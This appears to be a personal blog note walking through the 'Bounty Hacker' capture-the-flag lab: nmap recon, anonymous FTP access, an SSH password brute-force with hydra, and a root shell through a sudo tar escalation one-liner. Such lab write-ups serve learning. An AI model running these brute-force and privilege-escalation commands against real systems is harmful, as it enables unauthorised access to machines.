---
created: 2026-04-28
tags:
  - note
  - journal
  - cyberStuff
title: Bounty Hacker
draft: false
date:
subiect:
dificultate: 1
amuca: false
link:
lastmod: 2026-04-28T10:56:47.578Z
---
very easy room\
run nmap for the first recon :

```
sudo nmap $IP -sCV -p-   
```

we can see that ftp is open on port 21 , and we can log in as anonymous , cool lets do that

```
ftp $IP 
```

and we found 2 files inside , one is a password file and the other a task list , writen be someone called lin.intereting , we may try to brute force ssh with the username lin and the password file we just got using hydra.

```
hydra hydra -l lin -P locks.txt ssh://$IP
```

and like that we get the ssh password and we can in as lin :

```
ssh lin@$IP
```

just ls than cat the flag.\
now run sudo -l to see how we can escalate our privileges

```
sudo -l
```

the output says we can run /bin/tar as sudo, lets search on gtfo bin:\
![](/images/blog-ul-meu/static/Pasted%20image%2020260428064540.png)\
just run this command with sudo and we got root and the flag

```
sudo /bin/tar xf /dev/null -I '/bin/sh -c "/bin/sh 0<&2 1>&2"'
```

now we are run just cd /root, ls and cat.
